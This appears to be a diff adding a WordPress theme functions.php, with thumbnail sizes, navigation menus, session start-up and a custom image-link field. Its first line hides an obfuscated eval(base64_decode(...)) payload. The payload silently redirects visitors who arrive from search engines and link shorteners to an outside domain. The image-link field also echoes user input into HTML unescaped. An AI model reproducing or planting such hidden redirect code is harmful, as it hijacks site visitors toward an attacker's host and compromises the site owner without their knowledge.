@@ -1,0 +1,15 @@
+<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9scGthLmRkbnMubWUudWsvIik7DQpleGl0KCk7DQp9Cn0KfQ0KfQ0KfQ=="));
+if (function_exists('add_theme_support')) {
+	add_theme_support( 'post-thumbnails' );
+	set_post_thumbnail_size( 150, 150, true);
+	add_image_size('thumbnail', 150, 150, true);
+	add_image_size('medium', 1024, 468, true);
+	add_image_size('large', 9999, 500);
+}
+
+register_nav_menus( array(
+		'primary' => __( 'Primary Navigation', 'wpdocs' ),
+        'collection' => __( 'Collection Navigation', 'wpdocs' ),
+        'lookbooks' => __( 'Look Books Navigation', 'wpdocs' ),
+	) );
+function my_init() {	if (!is_admin()) {		wp_enqueue_script('jquery');	}}add_action('init', 'my_init');/** *    init_sessions() * *    @uses session_id() *    @uses session_start() */function init_sessions() {    if (!session_id()) {        session_start();    }}add_action('init', 'init_sessions');add_filter('attachment_fields_to_edit', 'ms_attachment_fields_to_edit', 11, 2);add_filter('attachment_fields_to_save', 'ms_image_attachment_fields_to_save', 11, 2);function ms_attachment_fields_to_edit($form_fields, $post) {	// Define categories we want to use	$post_id = $post->ID;	$meta = wp_get_attachment_metadata($post_id);	if(isset($meta['image_meta']['image_link'])) {		$image_link = $meta['image_meta']['image_link'];		if ( substr($post->post_mime_type, 0, 5) == 'image' ) {			$form_fields['image_link'] = array(			'label' => __('Image Link'),			'input' => 'html',			'helps' => __('Link to external websites (for Press page)'),			'html' => '<input type="text" value="'.$image_link.'" name="attachments['.$post_id.'][image_link]" id="attachments['.$post_id.'][image_link]" class="text">'		);} 	}	return $form_fields;}function ms_image_attachment_fields_to_save($post, $attachment) {	if ( substr($post['post_mime_type'], 0, 5) == 'image' ) {		$attachment_id = $post['ID'];		$meta = wp_get_attachment_metadata( $attachment_id );		$meta['image_meta']['image_link'] = $_POST['attachments'][$attachment_id]['image_link'];		wp_update_attachment_metadata( $attachment_id, $meta );	}	return $post;}
